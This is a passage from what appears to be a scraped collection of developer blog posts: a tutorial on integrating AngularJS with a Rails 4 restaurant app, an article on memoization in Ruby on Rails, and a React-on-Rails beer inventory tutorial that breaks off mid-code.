project: $ rails new restauranteur --database=postgresql --skip-test-unit If you're using Pow , add your project to Pow: $ ln -s /Users/jasonswett/projects/restauranteur ~/.pow/restauranteur Create the PostgreSQL database user: $ createuser -P -s -e restauranteur Add RSpec to your Gemfile: # Gemfile\ngem \"rspec-rails\", \"~> 2.14.0\" Install RSpec: $ bundle install\n$ rails g rspec:install Create the database: $ rake db:create Creating the Restaurant model Now that we have our project and database created, let's create our first resource. The Restaurant resource will have only one attribute: name , which is a string. $ rails generate scaffold restaurant name:string Now, just to be OCD about it, we'll make sure restaurant names are unique. # db/migrate/[timestamp]_create_restaurants.rb class CreateRestaurants < ActiveRecord :: Migration def change create_table :restaurants do | t | t . string :name t . timestamps end # Add the following line add_index :restaurants , :name , unique: true end end Run the migration: $ rake db:migrate Let's add some specs to verify that we can't create invalid restaurants. Notice that unique failure gives raw error. require 'spec_helper' describe Restaurant do before do @restaurant = Restaurant . new ( name: \"Momofuku\" ) end subject { @restaurant } it { should respond_to ( :name ) } it { should be_valid } describe \"when name is not present\" do before { @restaurant . name = \" \" } it { should_not be_valid } end describe \"when name is already taken\" do before do restaurant_with_same_name = @restaurant . dup restaurant_with_same_name . name = @restaurant . name . upcase restaurant_with_same_name . save end it { should_not be_valid } end end Adding these validators will make the specs pass: class Restaurant < ActiveRecord :: Base validates :name , presence: true , uniqueness: { case_sensitive: false } end We're now good to move on. Bringing AngularJS into the mix Rather than dump everything on you at once, I'd first like to demonstrate the simplest \"Hello, world\" version of an AngularJS-Rails application and then build our restaurant CRUD functionality onto that. There's no reason our \"Hello, world\" page must or should be tied to any particular Rails resource. For this reason, we'll create a StaticPagesController to serve up our AngularJS home page. Create the controller $ rails generate controller static_pages index Our root route right now is just the \"Welcome to Rails\" page. Let's set it to the index action of our new StaticPagesController : # config/routes.rb Restauranteur :: Application . routes . draw do # Add the following line root 'static_pages#index' end Download Angular In order to get our tests to work properly later, we'll need a file called angular-mocks.js . I don't think there's any mention of this in the Angular docs anywhere, but it's necessary. In the AngularJS tutorial , the docs list the latest bleeding-edge version, but if I recall correctly, I had problems with compatibility between angular.js and angular-mocks.js for the latest version. I know that versions 1.1.5 worked together, so even though that's not the latest stable version, that's the version I'm listing here. Of course as time goes on the compatibility situation will probably improve. Download angular.js and angular-mocks.js from code.angularjs.org and move the files into app/assets/javascripts . $ wget http://code.angularjs.org/1.1.5/angular.js \\\nhttp://code.angularjs.org/1.1.5/angular-mocks.js\n$ mv angular* app/assets/javascripts Add it to the asset pipeline Now we want to tell our application to require the AngularJS file, and we want to make sure it gets loaded before other files that depend on it. (We could use something like RequireJS to manage these dependencies, and that's probably what I would do on a production product, but for the purposes of this tutorial I want to keep the technology stack as thin as possible.) Note: Angular and Turbolinks can conflict with one another, so we disable them here // app/assets/javascripts/application.js // This is a manifest file that'll be compiled into application.js, which will include all the files // listed below. // // Any JavaScript/Coffee file within this directory, lib/assets/javascripts, vendor/assets/javascripts, // or vendor/assets/javascripts of plugins, if any, can be referenced here using a relative path. // // It's not advisable to add code directly here, but if you do, it'll appear at the bottom of the // compiled file. // // Read Sprockets README (https://github.com/sstephenson/sprockets#sprockets-directives) for details // about supported directives. // //= require jquery //= require jquery_ujs // Add the following two lines //= require angular //= require main //= require_tree . Set up the layout We'll add ng-app and ng-view, which signal that we have an Angular app in our page. Also notice that mentions of Turbolinks have been removed. <%= yield %> Creating an Angular controller First let's create a directory for our controllers. You can name it whatever you want. $ mkdir -p app/assets/javascripts/angular/controllers Now let's create the controller file itself. I'm calling this controller the \"home controller,\" and the convention in Angular is to append your controller filenames with Ctrl . Thus our filename will be app/assets/javascripts/angular/controllers/HomeCtrl.js.coffee : # app/assets/javascripts/angular/controllers/HomeCtrl.js.coffee @ restauranteur . controller 'HomeCtrl' , [ '$scope' , ( $scope ) -> # Notice how this controller body is empty ] Add an Angular route Now we'll add a routing directive in order to make our HomeCtrl be our \"default page.\" Here I'm defining my routing in app/assets/javascripts/main.js.coffee , but again I don't think the filename matters. # app/assets/javascripts/main.js.coffee # This line is related to our Angular app, not to our # HomeCtrl specifically. This is basically how we tell # Angular about the existence of our application. @ restauranteur = angular . module ( 'restauranteur' , []) # This routing directive tells Angular about the default # route for our application. The term \"otherwise\" here # might seem somewhat awkward, but it will make more # sense as we add more routes to our application. @ restauranteur . config ([ '$routeProvider' , ( $routeProvider ) -> $routeProvider . otherwise ({ templateUrl : '../templates/home.html' , controller : 'HomeCtrl' }) ]) Add an Angular template We'll also want a place to keep our Angular templates. I decided to put mine in public/templates . Again, you can place them wherever you like. mkdir public/templates If we create a file public/templates/home.html with some arbitrary content, we should be able to see it in the browser. This is the home page. Now, if you go to http://restauranteur.dev/ (or http://localhost:3000/ if you're not using Pow) and you should see the contents of home.html . An example of data binding That's kind of interesting, but probably not very impressive. Let's actually send something across the wire. Edit your app/assets/angular/controllers/HomeCtrl.js.coffee like this: # app/assets/angular/controllers/HomeCtrl.js.coffee @ restauranteur . controller 'HomeCtrl' , [ '$scope' , ( $scope ) -> $scope . foo = 'bar' ] This is kind of analagous to saying @foo = \"bar\" in a Rails controller. We can plug foo into the template by using the double-brace syntax like this: Value of \"foo\": {{foo}} Doing it for real this time We've already built a simple hello world app. Creating a full blown CRUD application isn't much harder. Seed the database Working with our restaurant CRUD will be a little more meaningful if we start with some restaurants in the database. Here's a seed file you can use. # db/seeds.rb\n\nRestaurant.create([\n  { name: \"The French Laundry\" },\n  { name: \"Chez Panisse\" },\n  { name: \"Bouchon\" },\n  { name: \"Noma\" },\n  { name: \"Taco Bell\" },\n]) rake db:seed Creating a restaurant index page First let's create a template folder for restaurants: mkdir public/templates/restaurants The first template we'll create is the index page: [index](/#)\n\n  * {{ restaurant.name }} I'll explain in a moment what these things mean. First let's create the controller: # app/assets/javascripts/angular/controllers/RestaurantIndexCtrl.js.coffee @ restauranteur . controller 'RestaurantIndexCtrl' , [ '$scope' , '$location' , '$http' , ( $scope , $location , $http ) -> $scope . restaurants = [] $http . get ( './restaurants.json' ). success (( data ) -> $scope . restaurants = data ) ] Lastly, we'll adjust our routing configuration: # app/assets/javascripts/main.js.coffee @ restauranteur = angular . module ( 'restauranteur' , []) @ restauranteur . config ([ '$routeProvider' , ( $routeProvider ) -> $routeProvider . when ( '/restaurants' , { templateUrl : '../templates/restaurants/index.html' , controller : 'RestaurantIndexCtrl' }). otherwise ({ templateUrl : '../templates/home.html' , controller : 'HomeCtrl' }) ]) Now, finally, we can go to the URI /#/restaurants and we should be able to see our list of restaurants. Before we move on let's add a test. Adding our first test Add JS test folder: mkdir spec/javascripts Write test: # spec/javascripts/controllers_spec.js.coffee describe \"Restauranteur controllers\" , -> beforeEach module ( \"restauranteur\" ) describe \"RestaurantIndexCtrl\" , -> it \"should set restaurants to an empty array\" , inject (( $controller ) -> scope = {} ctrl = $controller ( \"RestaurantIndexCtrl\" , $scope : scope ) expect ( scope . restaurants . length ). toBe 0 ) Add config: // spec/javascripts/restauranteur.conf.js module . exports = function ( config ) { config . set ({ basePath : ' ../.. ' , frameworks : [ ' jasmine ' ], autoWatch : true , preprocessors : { ' **/*.coffee ' : ' coffee ' }, files : [ ' app/assets/javascripts/angular.js ' , ' app/assets/javascripts/angular-mocks.js ' , ' app/assets/javascripts/main.js.coffee ' , ' app/assets/javascripts/angular/controllers/RestaurantIndexCtrl.js.coffee ' , ' app/assets/javascripts/angular/* ' , ' spec/javascripts/*_spec.js.coffee ' ] }); }; Install Karma and start the server: sudo npm install -g karma\nsudo npm install -g karma-ng-scenario\nkarma start spec/javascripts/restauranteur.conf.js If you go to http://localhost:9876/ , our test will run and be successful. If you'd like to see the test fail, change expect(scope.restaurants.length).toBe 0 to expect(scope.restaurants.length).toBe 1 and run the test again. The meaningfulness of this test we just added is obviously questionable, but my intention here is to save you the work of figuring out how to get your Angular code into a test harness. There are certain things, like the CoffeeScript preprocessor and angular-mocks.js inclusion that are totally not obvious and took me several hours of head-scratching to get right. Building out the restaurants page Let's now make a temporary adjustment to our restaurant index template: * {{restaurant.name}} ({{restaurant.id}}) If you now revisit /#/restaurants , you'll notice that none of the restaurants have their IDs. Why are they blank? When you generate scaffolding in Rails 4, it gives you some .jbuilder files: $ ls -1 app/views/restaurants/*.jbuilder\napp/views/restaurants/index.json.jbuilder\napp/views/restaurants/show.json.jbuilder If you open up app/views/restaurants/index.json.jbuilder , you'll see this: # app/views/restaurants/index.json.jbuilder\n\njson.array!(@restaurants) do |restaurant|\n  json.extract! restaurant, :name\n  json.url restaurant_url(restaurant, format: :json)\nend As you can see, it's including :name but not :id . Let's add it: # app/views/restaurants/index.json.jbuilder\n\njson.array!(@restaurants) do |restaurant|\n  json.extract! restaurant, :id, :name\n  json.url restaurant_url(restaurant, format: :json)\nend If you save the file and refresh /#/restaurants , you should see the IDs appear. Now let's change the template back to the way it originally was: [index](/#)\n\n  * {{ restaurant.name }} You may have noticed at some point that we're pointing these things at something called viewRestaurant() but we never actually defined anything called viewRestaurant() . Let's do that now: # app/assets/javascripts/angular/controllers/RestaurantIndexCtrl.js.coffee @ restauranteur . controller 'RestaurantIndexCtrl' , [ '$scope' , '$location' , '$http' , ( $scope , $location , $http ) -> $scope . restaurants = [] $http . get ( './restaurants.json' ). success (( data ) -> $scope . restaurants = data ) # Add the following lines $scope . viewRestaurant = ( id ) -> $location . url \"/restaurants/ #{ id } \" ] The convention in Rails is that resource_name/:id maps to a \"show\" page, and that's what we'll do here. Let's create a show template, route and controller. # {{restaurant.name}} # app/assets/javascripts/main.js.coffee @ restauranteur = angular . module ( 'restauranteur' , []) @ restauranteur . config ([ '$routeProvider' , ( $routeProvider ) -> $routeProvider . when ( '/restaurants' , { templateUrl : '../templates/restaurants/index.html' , controller : 'RestaurantIndexCtrl' }). when ( '/restaurants/:id' , { templateUrl : '../templates/restaurants/show.html' , controller : 'RestaurantShowCtrl' }). otherwise ({ templateUrl : '../templates/home.html' , controller : 'HomeCtrl' }) ]) # app/assets/javascripts/angular/controllers/RestaurantShowCtrl.js.coffee @ restauranteur . controller 'RestaurantShowCtrl' , [ '$scope' , '$http' , '$routeParams' , ( $scope , $http , $routeParams ) -> $http . get ( \"./restaurants/ #{ $routeParams . id } .json\" ). success (( data ) -> $scope . restaurant = data ) ] Now if you refresh /#/restaurants and click on a restaurant, you should find yourself at that restaurant's show page. Yay! That's all for now We may not have seen particularly impressive results, but I hope I've saved you some time plugging AngularJS into Rails 4. Next I might recommend looking into ngResource , which can help make CRUD functionality more DRY. Interested in learning more? Check out the great post by Adam Anderson, whose Bootstrapping an AngularJS app in Rails 4.0 series helped me get started with AngularJS and Rails. You might like to go through his tutorial as well, but this tutorial is different in the sense that I try to _really_spoon-feed you all the details, minimizing the chances you'll get stuck in the weeds.", "date": "2013-12-11"},
{"website": "Honey-Badger", "title": "Speeding up Rails with Memoization", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/ruby-rails-memoization/", "abstract": "When developing applications we often have methods that run slowly. Perhaps they need to query the database, or hit an external service, both of which can cause them to slow down. We could call the method every time we need that data and just accept the overhead, but if performance is a concern we have some options. For one, we can assign the data to a variable and re-use it, which would speed up the process. While a possible solution, manually managing that variable could quickly become tedious. But, what if instead, the method doing this \"slow work\" could just handle that variable for us? This would allow us to call the method in the same way, but have the method save and re-use the data. This is exactly what memoization does. Put simply, memoization is saving a method's return value so it does not have to be recomputed each time. As with all caching, you are effectively trading memory for time (i.e. you give up the memory required to store the value, but you save the time required to process the method). How to Memoize a Value Ruby provides a very clean idiom for memoizing values with the or-equals operator: ||= . This uses a logical OR ( || ) between left and right values, then assigns the result to the variable on the left. In action: value ||= expensive_method ( 123 ) #logically equivalent to: value = ( value || expensive_method ( 123 )) How Does Memoization Work To understand how this works you need to grasp two concepts: \"falsey\" values and lazy evaluation. We'll start with truthy-falsey first. Truthy and Falsey Ruby (like almost all other languages) has built-in keywords for boolean true and false values. They work exactly as you'd expect: if true #we always run this end if false # this will never run end However, Ruby (and many other languages) also has the concept of \"truthy\" and \"falsey\" values. This means values can be treated \"as if\" they were true or false . In Ruby only nil and false are falsey. All other values (including zero) are treated as true (note: other languages make different choices. For example C treats zero as false ). Re-using our example from above, we could also write: value = \"abc123\" # a string if value # we always run this end value = nil if value # this will never run end Lazy Evaluation Lazy evaluation is a form of optimization that is very common in programming languages. It allows the program to skip operations that are not necessary. The logical OR operator ( || ) returns true if either left or right-hand sides are true. This means that if the left-hand argument is true there is no point evaluating the right-hand side since we already know the result will be true.\nIf we were to implement this ourselves we might end up with something like this: def logical_or ( lhs , rhs ) return lhs if lhs rhs end If lhs and rhs were functions (e.g. lamdas) then you can see rhs will only execute if lhs is falsey. Or-Equals Combining these two concepts of truthy-falsey values and lazy evaluation shows us what the ||= operator is doing: value #defaults to nil value ||= \"test\" value ||= \"blah\" puts value => test We start with value being nil because it was not initialized. Next, we encounter our first ||= operator. value is falsey at this stage so we evaluate the right-hand side ( \"test\" ) and assign the result to value .\nNow we hit the second ||= operator, but this time value is truthy as it has the value \"test\" . We skip the evaluation of the right-hand side and continue with value untouched. Deciding When to Use Memoization When using memoization there are some questions we need to ask ourselves: How often is the value accessed? What causes it to change? How often does it change? If the value is only accessed once then caching the value is not going to be very useful, the more often the value is accessed, the more benefit we can get from caching it. When it comes to what causes it to change we need to look at what values are used in the method. Does it take arguments? If so the memoization probably needs to take this into account. Personally, I like using the memoist gem for this as it handles arguments for you. Lastly, we need to consider how often the value changes. Are there instance variables that cause it to change? Do we need to clear the cached value when they change? Should the value be cached at the object level or the class level? To answer these questions let's look at a simple example and step through the decisions: class ProfitLossReport def initialize ( title , expenses , invoices ) @expenses = expenses @invoices = invoices @title = title end def title \" #{ @title } #{ Time . current } \" end def cost @expenses . sum ( :amount ) end def revenue @invoices . sum ( :amount ) end def profit revenue - cost end def average_profit ( months ) profit / months . to_f end end Calling code is not shown here, but it's a good guess that the title method is probably only called once, it also uses Time.current so memoizing it could mean the value instantly becomes stale. The revenue and cost methods are hit several times even within this class. Given that they both require hitting the database, they would be prime candidates for memoizing if performance became an issue. Assuming we memoize these, then profit shouldn't need to be memoized, otherwise, we're just adding caching on top of caching for minimal gains. Finally, we have average_profit . The value here relies on the argument so our memoizing has to take this into account. For a simple case like revenue we can just do this: def revenue @revenue ||= @invoices . sum ( :amount ) end For average_profit though, we need a different value for each argument that is passed in. We could use memoist for this, but for the sake of clarity we'll roll our own solution here: def average_profit ( months ) @average_profit ||= {} @average_profit [ months ] ||= profit / months . to_f end Here we're using a hash to keep track of our computed values. First we ensure @average_profit has been initialized, then we use the argument passed in is as the hash key. Memoizing at the Class Level or Instance Level Most of the time memoization is done at the instance level, meaning we use an instance variable to hold the computed value. This also means that whenever we create a new instance of the object it does not benefit from the \"cached\" value. Here's a very simple illustration: class MemoizedDemo def value @value ||= computed_value end def computed_value puts \"Crunching Numbers\" rand ( 100 ) end end Using this object we can see the results: demo = MemoizedDemo . new => #<MemoizedDemo:0x00007f95e5d9d398> demo . value Crunching Numbers => 19 demo . value => 19 MemoizedDemo . new . value Crunching Numbers => 93 We can change this by simply using a class-level variable (with @@ ) for our memoized value: def value @@value ||= computed_value end The results then become: demo = MemoizedDemo.new\n=> #<MemoizedDemo:0x00007f95e5d9d398>\ndemo.value\nCrunching Numbers\n=> 60\ndemo.value\n=> 60\nMemoizedDemo.new.value\n=> 60 You may not want class-level memoization often, but it is there as an option. However, if you need a value to be cached at this level it is probably worth looking at caching the value with an external store like Redis or memcached. Common Memoization Use Cases in Ruby on Rails Applications In Rails applications, the most common use-case I see for memoization is reducing database calls, particularly when a value is not going to change within a single request. \"Finder\" methods for looking up records in controllers are a good example of this kind of database call such as: def current_user @current_user ||= User . find ( params [ :user_id ]) end Another common place is if you use some type of decorator/presenter/view-model type of architecture for rendering views. Methods in these objects often have good candidates for memoization because they only persist for the life of the request, the data is normally not mutated, and some methods are probably hit multiple times when rendering the views. Memoization Gotchas One of the biggest gotchas is memoizing things when it is not really necessary. Things like string interpolation can look like easy candidates for memoization, but in reality, they are unlikely to be causing any noticeable impact on your site's performance (unless of course you are using exceptionally large strings or doing a very large amount of string manipulation), for example: def title # memoization here is not going to have much of an impact on our performance @title ||= \" #{ @object . published_at } - #{ @object . title } \" end Another thing to watch for is our old friend cache invalidation, particularly if your memoized value depends on the state of the object. One way to help prevent this is to cache at the lowest level you can. Instead of caching a method computing a + b it may be better to cache the a and b methods individually. # Instead of this def profit # anyone else calling 'revenue' or 'losses' is not benefitting from the caching here # and what happens if the 'revenue' or 'losses' value changes, will we remember to update profit? @profit ||= ( revenue - losses ) end # try this def profit # no longer cached, but subtraction is a fast calculation revenue - losses end def revenue @revenue ||= Invoice . all . sum ( :amount ) end def losses @losses ||= Purchase . all . sum ( :amount ) end The last gotcha is due to how lazy evaluation works - you will have to do something a bit more custom if you need to memoize a falsey value (i.e nil or false), as the ||= idiom will always execute the right-hand side if your saved value is falsey. In my experience, it's not often you need to cache these values, but if you do, you may need to add a boolean flag to indicate it's already been computed, or use another caching mechanism. def last_post # if the user has no posts, we will hit the database every time this method is called @last_post ||= Post . where ( user: current_user ). order_by ( created_at: :desc ). first end # As a simple workaround we could do something like: def last_post return @last_post if @last_post_checked @last_post_checked = true @last_post ||= Post . where ( user: current_user ). order_by ( created_at: :desc ). first end When Memoization is Not Enough Memoization can be a cheap and effective way to improve performance in parts of your application, but it's not without its drawbacks. One big one is persistence; for common instance-level memoization, the value is only saved for that one particular object. This makes memoization great for saving values for the life of a web request, but doesn't give you the full benefits of caching if you have values that would be the same for multiple requests and are being re-computed each time. Class-level memoization could help with this, but it becomes more difficult to manage cache invalidation. Not to mention that if your server reboots those cached values will be lost, and they can't be shared among multiple web servers. In the next issue in this series on caching we'll look at Rails' solution to these problems - low-level caching. Allowing you to cache values to an external store that can be shared among servers, and manage cache invalidation with expiry timeouts and dynamic cache keys.", "date": "2020-05-20"},
{"website": "Honey-Badger", "title": "React on Rails: Building a Simple App", "author": ["Julio Sampaio"], "link": "https://www.honeybadger.io/blog/react-rails/", "abstract": "Companies that build the entire front-end side of their applications often choose the same framework, such as Rails, to build the back-end. For many years, this has been the best and most reliable option. Today, tons of libraries and frameworks, in a constantly evolving front-end universe, allow developers to select different platforms for both the back and front-end and easily integrate them. React has become the titan of the front-end Pangea. If you work with Ruby on Rails, chances are that you once needed to switch the default Rails pages to React code (or any other front framework). Perhaps, you simply love Rails + React features and would love to integrate the power of both techs into a single app. And, that’s ok! This article aims to explore a real-world example: a CRUD application that manages an inventory of beer products. It will be initially created with Rails, and then a new front-end made with React with be further integrated. Beer CRUD application. In a few steps, you’ll understand the main pieces of React, how Rails embraces it, and how you can start integrating both Rails and React into your future projects. Setup As prerequisites, you need to have an environment set up with Ruby (and Rails ), Node.js , and Yarn . You can preferably choose npm to manage the front packages, but we’ll stick to Yarn for simplicity. In a folder of your preference, run the following command: rails new crud-rails-react This will start our Rails project. Then, open the created project in your IDE and go directly to the Gemfile . We need to fix a bug that this command generates for the SQLite gem. So, make sure to locate the sqlite3 gem and change it to the following: gem 'sqlite3' , '~> 1.3.10' This will prevent some known errors related to database versioning since we’ll be using SQLite as the default database for the CRUD example. Don’t worry, though; in other databases, this problem won’t happen. Database Config I usually prefer to build things from the base to the top layers, so let’s start creating the database models. We’ll only need one, so there is no better command feature for the task than Rails scaffolding: rails g scaffold Beer brand:string style:string country:string quantity:integer & rake db:migrate This model is pretty basic, so feel free to add other attributes and types as you go. Within the db/migrate folder, there’s a new file with a name ending in “_ create_beers.rb ”. This is the record that Rails created for us to represent a beer. The model, in turn, will be generated under the app/models folder. Leave them as they are and add the following lines of code to the db/seeds.rb file: Beer . create ( brand: 'Double Stout' , style: 'Stout' , country: 'England' , quantity: 54 ) Beer . create ( brand: 'Spaten' , style: 'Helles' , country: 'Germany' , quantity: 3 ) Beer . create ( brand: 'Newcastle' , style: 'Brown ale' , country: 'UK' , quantity: 12 ) This file will store the initial data load for the database when the app starts up. To release them into the database, run the following command: rake db:seed That’s it! Now, you have some beers at your table . Webpacker Setup Webpacker is one of the most widely used static module bundlers for JavaScript applications. Because of that, it’s the perfect match to incorporate the React capabilities into an existing application. Rails also provides us with a Webpacker bundler that’s fully adapted to manage JavaScript-like applications within Rails. To install it, add a second line to your Gemfile , as follows: gem 'webpacker' , '~> 4.3.x' Great! This is the only gem we’ll need to add for the entire app development. That’s only possible because we’re delegating the front responsibilities to Yarn, which will be set later on in this article. Now, it’s time to install the updates by issuing the following commands: bundle install bundle exec rake webpacker:install\nbundle exec rake webpacker:install:react The first one is well known by most Rails developers. We’re simply installing all the dependencies, including the Webpacker itself. Once Webpacker is installed, we can emulate its commands through Rake to install the Webpacker dependencies, as well as the React ones. This is a very important step because this is where Webpacker will make sure all of your JavaScript dependencies are properly set to a Rails environment, so don’t skip it or try running them directly as you usually do with npm or Yarn, ok? When the commands are complete, a couple of folders and files (like the node_modules and the package.json ) will also be created. Front-end Setup All the settings we’ve made so far are enough to have the CRUD application working with Rails only. If you start the Rails server through the rails s command, this will be the result: Rails auto-generated beer CRUD. However, we want our own CRUD with React. First, you need to make sure that all the required front-end dependencies are configured through Yarn: React React Router to deal with the navigation into the React app Ant Design for ready-to-use React components Ant Design (known as antd) is a rich open-source library for enterprise-level applications. It provides a bunch of highly customizable React components that simplify a lot the development of web apps. To get everything installed, run the following command: yarn add antd react-router-dom We don’t need to explicitly add the react library since react-router-dom will do it. At this point, when you open the package.json file, this will be the auto-generated content: { \"dependencies\" : { \"@babel/preset-react\" : \"^7.12.1\" , \"@rails/webpacker\" : \"4.3.0\" , \"antd\" : \"^4.7.2\" , \"babel-plugin-transform-react-remove-prop-types\" : \"^0.4.24\" , \"prop-types\" : \"^15.7.2\" , \"react\" : \"^17.0.0\" , \"react-dom\" : \"^17.0.0\" , \"react-router-dom\" : \"^5.2.0\" }, \"devDependencies\" : { \"webpack-dev-server\" : \"^3.11.0\" } } That’s the most basic setup for a Rails-React combo. So, we’re good to move on to the code. Adapting the Rails Side Some important actions must be addressed on the Rails side before proceeding to the front. First, we need to define the controller that’ll centralize page redirects. Since we’re creating a single-page application (SPA), only one controller is needed, which was already created: BeersController . Open it under the app/controllers folder and change its content as follows: class BeersController < ApplicationController def index end end Don’t worry; all the code we’ve removed will be placed in the next controller to be created. This controller’s only function is to provide a direct route from Rails to React, which is why we’re only setting the index method. To connect directly with it, let’s open the routes.rb file under the config folder and change its content to the following: Rails . application . routes . draw do root 'beers#index' # For details on the DSL available within this file, see http://guides.rubyonrails.org/routing.html end Note the new root config. Yes, we’re mapping the root’s endpoint to the beers index method. You’ll also need to empty the index.html.erb file within the app/views/beers folder since we don’t want any of the Rails web content to be rendered. It’s a trick we can use to force Rails to exhibit React code only. Beer API Now, let’s move on to Beer API creation. The API structure will be practically the same as the BeersController but with some slight changes. To create it, run the following command: rails generate controller api/v1/Beers Make sure to create it using a versioning system. This will allow you to evolve your API in the future and distinguish it from ordinary controllers. Now, open the app/controllers/api/v1/beers_controller.rb file and replace the code with the following: class Api::V1::BeersController < ApplicationController before_action :set_beer , only: [ :show , :edit , :update , :destroy ] # GET /beers # GET /beers.json def index @beers = Beer . all . order ( brand: :asc ) render json: @beers end # GET /beers/1 # GET /beers/1.json def show if @beer render json: @beer else render json: @beer . errors end end # GET /beers/new def new @beer = Beer . new end # GET /beers/1/edit def edit end # POST /beers # POST /beers.json def create @beer = Beer . new ( beer_params ) if @beer . save render json: @beer else render json: @beer . errors end end # PATCH/PUT /beers/1 # PATCH/PUT /beers/1.json def update end # DELETE /beers/1 # DELETE /beers/1.json def destroy @beer . destroy render json: { notice: 'Beer was successfully removed.' } end private # Use callbacks to share common setup or constraints between actions. def set_beer @beer = Beer . find ( params [ :id ]) end # Only allow a list of trusted parameters through. def beer_params params . permit ( :brand , :style , :country , :quantity ) end end Most of the operations were recycled from the previous controller. The before_action snippet will take care of recovering the proper beer object according to the id parameter within the requests. Only the operations placed into the array after the :only clause will need this auto-recover feature. The rest of the methods are equivalent to each of the CRUD’s operations. Just remember to always return JSON as a response to your requests because that’s the format we’ll be using within our React components. Finally, you’ll need to adapt config/routes.rb again to include the newly created routes. So, make sure to change the file contents to the following: Rails . application . routes . draw do namespace :api do namespace :v1 do get 'beers/index' post 'beers/create' delete 'beers/:id' , to: 'beers#destroy' end end root 'beers#index' # For details on the DSL available within this file, see http://guides.rubyonrails.org/routing.html end The destroy route demonstrates how to map to the destroy method if it’s not explicitly set in the path. React Components React works through components, which act like the building blocks of a web application. Each one does one or more tasks that make sense as a context. In short, a component is made of a JavaScript class or function that can receive properties as parameters, process business logic within it, and, in the end, return a functional UI component representing a portion of the screen. Take the following code snippet extracted from the next examples we’ll build: < Layout > < Header /> < Content > ... </ Content > < Footer > Honeybadger ©2020. </ Footer > </ Layout > Yes, React components use a custom markup language called JSX (JavaScript XML) that closely resembles HTML. All of the HTML tags are available within JSX files, too. You can read more on JSX here . The example above illustrates how antd deals with a structural layout component. Components are made out of other components and stacked on top of each other, composing a whole. Some receive properties (optional or not), and some can have inner contents. Components can be class- or function-based. Class Components Class-based components are created as usual JavaScript classes, like the one shown below: class Beers extends React . Component {} They inherit from the React.Component class, have a lifecycle , and provide utilization methods to execute code before initialization, rendering, and destroying phases. However, the most important (and required) method is render() , which is called every time the component is updated. Functional Components Functional components make use of ES6’s arrow function and simplify React components in terms of syntax and complexity. The same Beer component above would be represented in a function as follows: const Beers = () => < div > My Beers </ div >; This is much simpler, isn’t it? Setting Up React We’ve already emptied the Rails index page. Now, we’ll let Rails know that it needs to make React its default front-end. To achieve this, you need to add the following line of code to the &lt;head> tag of your app/views/layouts/application.html.erb file: < %= javascript_pack_tag 'index' %> This will add the JavaScript pack to our application header, which will cause all the JavaScript files, including React ones, to be executed within the index page. We need to make sure that the index.jsx file has the same name since it is pointed at the import pack. For this purpose, let’s rename the autogenerated app/javascript/packs/hello_react.jsx file to index.jsx . Then, replace the code with the following: import React from \" react \" ; import { render } from \" react-dom \" ; import App from \" ../components/App \" ; document . addEventListener ( \" DOMContentLoaded \" , () => { render (< App />, document . body . appendChild ( document . createElement ( \" div \" ))); }); Don’t mistake this file for the React application file, as it is just the file that will load the entire React app hierarchy into the DOM through ReactDOM's render function. Usually, every React application starts from an index.js file that loads everything needed, including React itself. The App tag maps the top component of our hierarchy. So, let’s create it as index.jsx under the javascript/components folder (create the folders manually in case they don’t exist yet) and place the following code into it: import React from \" react \" ; import Routes from \" ../routes/index \" ; import \" antd/dist/antd.css \" ; export default () => <> { Routes } </>; Alternatively, you can import the antd CSS file within the index.jsx . Either approach will work. The list of routes is placed under the routes folder. They’re extracted from the React Router library, which does most of the hard work for us. This is its content: import React from \" react \" ; import { BrowserRouter as Router , Route , Switch } from \" react-router-dom \" ; import Home from \" ../components/Home \" ; export default ( < Router > < Switch > < Route path = \"/\" exact component = { Home } /> </ Switch > </ Router > ); Each of your routes must be mapped within a different Route tag. The path parameter must match the URI of each route endpoint, while the component param indicates the component to which the React Router should redirect the request. Recall that we will have a single route for our SPA. You can also add other paths here in case you want to map a /beers for the listing of beers, for example, but we’ll keep it simple. Also, note that we’re importing the Home component here, which doesn’t exist yet. So, let’s create it as Home.jsx under the components folder. Then, add the following code to it: import { Layout } from \" antd \" ; import React from \" react \" ; import Beers from \" ./Beers \" ; import Header from \" ./Header \" ; const { Content , Footer } = Layout ; export default () => ( < Layout className = \"layout\" > < Header /> < Content style = { { padding : \" 0 50px \" } } > < div className = \"site-layout-content\" style = { { margin : \" 100px auto \" } } > < h1 > Beer Catalog </ h1 > < Beers /> </ div > </ Content > < Footer style = { { textAlign : \" center \" } } > Honeybadger ©2020. </ Footer > </ Layout > ); When it comes to React components, I prefer to build them from top to bottom. This way, you can have an overall look at all the needed components to make the app work as a whole. The Home component behaves like an assembler; it accommodates all the other component pieces of the app, like Layout , Header , Content, and Footer . It is important to properly distinguish from where each of these pieces is coming. Antd provides a bunch of ready components, such as Layout, Content, and Footer, to compose your screens. They’re primarily focused on the structure of the page parts, but some also offer built-in CSS styles, which will benefit us with a better look. The Header Component The Header.jsx component file, which should also be created within the javascript/components folder, will keep the header’s content. It includes a simple antd menu and a div with the Honeybadger logo, as shown below: Antd menu items. Below, you can find the code to place into the Header.jsx : import React from \" react \" ; import { Layout , Menu } from \" antd \" ; const { Header } = Layout ; export default () => ( < Header > < div className = \"logo\" /> < Menu theme = \"dark\" mode = \"horizontal\" defaultSelectedKeys = { [ \" 1 \" ] } > < Menu . Item key = \"1\" > Home </ Menu . Item > < Menu . Item key = \"2\" > Our Services </ Menu . Item > < Menu . Item key = \"3\" > Contact </ Menu . Item > </ Menu > </ Header > ); The Antd Menu component is quite simple to use but broad in terms of available customization options, allowing us to create, for example, navigation drawers, drop-downs, groups, and subgroups. Note that we’re providing defaultSelectedKeys , an array that tells the menu which items are active. Our menus won’t navigate to anywhere; they’ll occupy the screen to fulfill the look-and-feel only. So, let’s move on to the Beers component. The Beers Component This component is focused on the listing of beers, and the actions available within the table, such as deletion, data pagination, and table reloading. Visual representation of React actions & components. Take a look at the image above. We’ve broken down the components and actions to a lower level, so you can better understand what will be done here. React State React components are built with a state object. This object acts as a store directly attached to the given component. Each component has its own state object, and every time you change the state, the component gets re-rendered. The first action of our Beers component is to display the listing on a table. For this purpose, we’ll need to hold this list in an array: state = { beers : [], }; The Beers Listing To feed this array, we’ll need to retrieve the list from the API controller we created earlier. Review the function that’ll retrieve it: loadBeers = () => { const url = \" api/v1/beers/index \" ; fetch ( url ) . then (( data ) => { if ( data . ok ) { return data . json (); } throw new Error ( \" Network error. \" ); }) . then (( data ) => { data . forEach (( beer ) => { const newEl = { key : beer . id , id : beer . id , brand : beer . brand , style : beer . style , country : beer . country , quantity : beer . quantity , }; this . setState (( prevState 